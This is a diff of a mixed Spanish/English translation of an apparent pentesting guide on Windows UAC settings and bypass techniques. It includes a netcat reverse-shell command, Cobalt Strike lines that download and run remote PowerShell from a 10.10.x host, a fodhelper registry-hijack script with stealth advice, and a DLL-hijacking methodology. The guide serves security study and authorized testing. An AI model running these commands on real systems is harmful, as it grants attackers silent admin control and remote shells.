@@ -4,26 +4,26 @@
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **aviso de consentimiento para actividades con privilegios elevados**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administrativa** a menos que un administrador autorice explícitamente que estas aplicaciones/tareas tengan acceso con nivel de administrador para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita una **solicitud de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían potencialmente comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administradora** a menos que un administrador autorice explícitamente a estas aplicaciones/tareas a tener acceso a nivel administrador para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.
 
-Para más información sobre los niveles de integridad:
+Para más info sobre los niveles de `integrity`:
 
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Cuando UAC está activo, a un usuario administrador se le asignan 2 tokens: uno con privilegios de usuario estándar, para realizar acciones regulares a nivel normal, y otro con privilegios de administrador.
+Cuando UAC está activo, a un usuario administrador se le asignan 2 tokens: uno de usuario estándar, para realizar acciones normales a nivel regular, y otro con privilegios de administrador.
 
-Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica cómo funciona UAC en profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico a su organización a nivel local (usando secpol.msc), o configurarlo y desplegarlo vía Group Policy Objects (GPO) en un entorno de Active Directory. Las distintas configuraciones se tratan en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona detalle adicional:
+Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC de forma específica para su organización a nivel local (usando secpol.msc), o configurarlo y desplegarlo mediante Group Policy Objects (GPO) en un entorno de dominio de Active Directory. Los distintos ajustes se analizan en detalle [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:
 
 | Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
 | [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                               |
 | [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                               |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios que no son de Windows |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el escritorio seguro               |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado en Home) Deshabilitado (predeterminado en Enterprise) |
+| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
+| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
 | [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                               |
 | [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                   |
 | [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                   |
@@ -32,21 +32,21 @@ Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protec
 
 ### UAC Bypass Theory
 
-Algunos programas se **autoelevan automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifests**_ la opción _**autoElevate**_ con valor _**True**_. El binario también tiene que estar **firmado por Microsoft**.
+Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.
 
-Muchos procesos auto-elevados exponen **funcionalidad vía objetos COM o servidores RPC**, que pueden invocarse desde procesos que se ejecutan con integridad media (privilegios a nivel de usuario normal). Nota que COM (Component Object Model) y RPC (Remote Procedure Call) son métodos que usan los programas de Windows para comunicarse y ejecutar funciones entre procesos diferentes. Por ejemplo, **`IFileOperation COM object`** está diseñado para manejar operaciones de archivos (copiar, eliminar, mover) y puede autoelevar privilegios sin mostrar un aviso.
+Many auto-elevate processes expose **funcionalidad vía COM objects o RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.
 
-Ten en cuenta que se pueden realizar algunas comprobaciones, como verificar si el proceso se ejecutó desde el directorio **System32**, lo cual puede omitirse por ejemplo **inyectando en explorer.exe** u otro ejecutable ubicado en System32.
+Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.
 
-Otra forma de sortear estas comprobaciones es **modificar el PEB**. Cada proceso en Windows tiene un Process Environment Block (PEB), que incluye datos importantes sobre el proceso, como su ruta ejecutable. Al modificar el PEB, los atacantes pueden falsificar (spoofear) la ubicación de su propio proceso malicioso, haciendo que parezca ejecutarse desde un directorio de confianza (como system32). Esta información falsificada engaña al objeto COM para autoelevar privilegios sin pedir confirmación al usuario.
+Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like System32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.
 
-Entonces, para **eludir** el **UAC** (elevar de nivel de integridad **medium** a **high**) algunos atacantes usan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un **proceso con nivel de integridad alto**.
+Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.
 
-Puedes **comprobar** el _**Manifest**_ de un binario usando la herramienta _**sigcheck.exe**_ de Sysinternals. (`sigcheck.exe -m <file>`) Y puedes **ver** el **nivel de integridad** de los procesos usando _Process Explorer_ o _Process Monitor_ (de Sysinternals).
+You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).
 
-### Comprobar UAC
+### Check UAC
 
-Para confirmar si UAC está habilitado haz:
+Para confirmar si UAC está habilitado, ejecuta:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
@@ -62,45 +62,45 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-- Si **`0`**, entonces UAC no pedirá confirmación (como **desactivado**)
-- Si **`1`** se le **pide al administrador nombre de usuario y contraseña** para ejecutar el binario con privilegios elevados (on Secure Desktop)
-- Si **`2`** (**Notificarme siempre**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con privilegios elevados (on Secure Desktop)
-- Si **`3`** como `1` pero no es necesario en Secure Desktop
-- Si **`4`** como `2` pero no es necesario en Secure Desktop
-- Si **`5`**(**predeterminado**) solicitará al administrador que confirme la ejecución de binarios no pertenecientes a Windows con privilegios elevados
+- If **`0`** then, UAC won't prompt (like **disabled**)
+- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
+- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
+- If **`3`** like `1` but not necessary on Secure Desktop
+- If **`4`** like `2` but not necessary on Secure Desktop
+- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
 
 Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
-Si el valor es **`0`**, entonces solo el usuario **RID 500** (**built-in Administrator**) puede realizar **tareas de administrador sin UAC**, y si es `1`, **todas las cuentas dentro del grupo "Administrators"** pueden hacerlo.
+If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
 
 And, finally take a look at the value of the key **`FilterAdministratorToken`**\
-Si **`0`** (predeterminado), la cuenta **built-in Administrator** puede realizar tareas de administración remota y si **`1`** la cuenta built-in Administrator **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté establecido en `1`.
+If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.
 
 #### Summary
 
-- Si `EnableLUA=0` o **no existe**, **no hay UAC para nadie**
-- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`, no hay UAC para nadie**
-- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, no hay UAC para RID 500 (Built-in Administrator)**
-- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**
+- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
 
-Toda esta información puede recopilarse usando el módulo **metasploit**: `post/windows/gather/win_privs`
+All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`
 
-También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
+You can also check the groups of your user and get the integrity level:
 ```
 net user %username%
 whoami /groups | findstr Level
 ```
-## UAC bypass
+## Bypass de UAC
 
 > [!TIP]
-> Tenga en cuenta que si tiene acceso gráfico a la víctima, UAC bypass es muy sencillo ya que simplemente puede hacer clic en "Yes" cuando aparezca el UAC prompt
+> Ten en cuenta que si tienes acceso gráfico a la víctima, el bypass de UAC es sencillo ya que puedes simplemente hacer clic en "Sí" cuando aparece el aviso de UAC
 
-The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
+El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, tu proceso se está ejecutando en un contexto de integridad medio, y tu usuario pertenece al grupo de Administradores**.
 
-Es importante mencionar que es **mucho más difícil eludir el UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**
+Es importante mencionar que es **mucho más difícil bypassear el UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**
 
-### UAC deshabilitado
+### UAC desactivado
 
-Si el UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**) puedes **execute a reverse shell with admin privileges** (nivel de integridad alto) usando algo como:
+Si UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**) puedes **ejecutar un reverse shell con privilegios de administrador** (nivel de integridad alto) usando algo como:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -111,9 +111,9 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Muy** Básico UAC "bypass" (acceso completo al sistema de archivos)
+### **Muy** básico UAC "bypass" (acceso completo al sistema de archivos)
 
-Si tienes una shell con un usuario que pertenece al grupo Administrators puedes **mount the C$** compartido vía SMB (sistema de archivos) local como una nueva unidad y tendrás **access to everything inside the file system** (incluso la carpeta de inicio de Administrator).
+Si tienes una shell con un usuario que pertenece al grupo Administrators puedes **montar el recurso compartido C$** vía SMB (sistema de archivos) local en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio de Administrator).
 
 > [!WARNING]
 > **Parece que este truco ya no funciona**
@@ -126,7 +126,7 @@ dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
 ### UAC bypass con cobalt strike
 
-Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel de seguridad máximo.
+Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad.
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -138,7 +138,7 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** y **Metasploit** también tienen varios módulos para **bypass** de la **UAC**.
+**Empire** y **Metasploit** también tienen varios módulos para **bypass** del **UAC**.
 
 ### KRBUACBypass
 
@@ -146,10 +146,10 @@ Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varios exploits de bypass de UAC. Tenga en cuenta que necesitará **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitará saber **cuál necesita.**\
-Debe **tener cuidado** porque algunos bypasses **harán que otros programas muestren avisos** que **alertarán** al **usuario** de que algo está ocurriendo.
+[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varios UAC bypass exploits. Tenga en cuenta que necesitará **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitará saber **cuál necesita.**\
+Debería **tener cuidado** porque algunos **bypasses** provocarán que **otros programas** muestren avisos que **alertarán** al **usuario** de que algo está ocurriendo.
 
-UACME tiene la **versión de build desde la cual cada técnica empezó a funcionar**. Puede buscar una técnica que afecte a sus versiones:
+UACME indica la **versión de compilación a partir de la cual cada técnica empezó a funcionar**. Puede buscar una técnica que afecte a sus versiones:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -157,17 +157,17 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Además, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) obtienes la versión de Windows `1607` a partir de los números de compilación.
+Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
-El binario confiable `fodhelper.exe` se autoeleva en Windows modernos. Al ejecutarse, consulta la ruta de registro por usuario que aparece a continuación sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso de Medium Integrity (el usuario está en Administrators) inicie un proceso de High Integrity sin mostrar un UAC prompt.
+El binario confiable `fodhelper.exe` se eleva automáticamente en Windows modernos. Cuando se ejecuta, consulta la ruta del registro por usuario que aparece abajo sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso Medium Integrity (el usuario está en Administrators) inicie un proceso High Integrity sin un UAC prompt.
 
-Ruta del registro consultada por fodhelper:
+Registry path queried by fodhelper:
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-Pasos de PowerShell (set your payload, then trigger):
+Pasos de PowerShell (configura tu payload, luego actívalo):
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -187,44 +187,44 @@ Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
 ```
 Notes:
-- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/permisivo (no Always Notify con restricciones adicionales).
+- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/leniente (no Always Notify con restricciones extras).
 - Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
-- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.
+- Payload puede ser cualquier comando (PowerShell, cmd, o la ruta de un EXE). Evita UIs que requieran interacción para mantener el sigilo.
 
-#### Más sobre UAC bypass
+#### More UAC bypass
 
-**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
+**All** the techniques used here to bypass UAC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
 
-You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
+Puedes obtenerla usando una sesión **meterpreter**. Migra a un **process** que tenga el valor **Session** igual a **1**:
 
 ![](<../../images/image (863).png>)
 
-(_explorer.exe_ should works)
+(_explorer.exe_ debería funcionar)
 
-### UAC Bypass con GUI
+### UAC Bypass with GUI
 
-Si tienes acceso a una **GUI puedes simplemente aceptar el UAC prompt** cuando lo recibas; realmente no necesitas un bypass. Por lo tanto, obtener acceso a una GUI te permitirá bypassear el UAC.
+Si tienes acceso a una **GUI puedes simplemente aceptar el prompt de UAC** cuando aparezca, no necesitas realmente un bypass. Por tanto, obtener acceso a una GUI te permitirá bypassear el UAC.
 
-Además, si obtienes una sesión GUI que alguien estaba usando (potencialmente vía RDP) hay **algunas herramientas que se estarán ejecutando como administrator** desde las cuales podrías **run** un **cmd** por ejemplo **as admin** directamente sin que UAC vuelva a solicitarlo, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto puede ser un poco más **stealthy**.
+Además, si consigues una sesión GUI que alguien estaba usando (potencialmente vía RDP) hay **algunas herramientas que se ejecutarán como administrador** desde las cuales podrías **ejecutar** un **cmd** por ejemplo **como admin** directamente sin que UAC te vuelva a pedir confirmación, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto puede ser un poco más **sigiloso**.
 
 ### Noisy brute-force UAC bypass
 
-Si no te importa ser ruidoso siempre podrías **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **ask to elevate permissions until the user does accepts it**.
+Si no te importa ser ruidoso siempre puedes **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar permisos hasta que el usuario lo acepte**.
 
 ### Your own bypass - Basic UAC bypass methodology
 
-Si miras **UACME** notarás que **la mayoría de los UAC bypasses abusan de una vulnerabilidad Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Si miras **UACME** notarás que **la mayoría de los bypasses de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
-2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
-3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
-1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
+1. Encuentra un binario que **autoelevate** (verifica que cuando se ejecuta corre en un nivel de integridad alto).
+2. Con procmon busca "**NAME NOT FOUND**" eventos que puedan ser vulnerables a **DLL Hijacking**.
+3. Probablemente necesitarás **escribir** la DLL dentro de algunos **protected paths** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes bypassear esto usando:
+1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un CAB file dentro de protected paths (porque esta herramienta se ejecuta desde un nivel de integridad alto).
 2. **IFileOperation**: Windows 10.
-4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
+4. Prepara un **script** para copiar tu DLL dentro del path protegido y ejecutar el binario vulnerable y autoelevated.
 
-### Otra técnica de UAC bypass
+### Another UAC bypass technique
 
-Consiste en observar si un **autoElevated binary** intenta **read** desde el **registry** el **name/path** de un **binary** o **command** a ser **executed** (esto es más interesante si el binary busca esta información dentro de **HKCU**).
+Consiste en observar si un **autoElevated binary** intenta **leer** del **registro** el **name/path** de un **binary** o **command** a **ejecutar** (esto es más interesante si el binary busca esta información dentro de **HKCU**).
 
 ## References
 - [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
